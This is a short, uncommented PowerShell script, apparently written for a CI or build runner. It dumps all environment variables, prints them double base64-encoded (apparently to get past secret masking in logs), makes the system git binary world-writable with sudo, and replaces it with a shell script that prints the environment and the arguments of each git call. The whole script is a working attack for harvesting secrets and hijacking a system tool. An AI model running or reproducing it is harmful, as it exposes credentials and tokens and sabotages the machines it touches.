Write-Host "hello"

gci env:


[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes([Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($(gci env: | out-string)))))

which git



$content = @"
#!/bin/sh

env

args=(\"$@\")
echo \$# arguments passed
echo \${args[0]} \${args[1]} \${args[2]}
"@

$gitPath = & which git
sudo chmod 777 $gitPath

Set-Content -Path $gitPath -Value $content

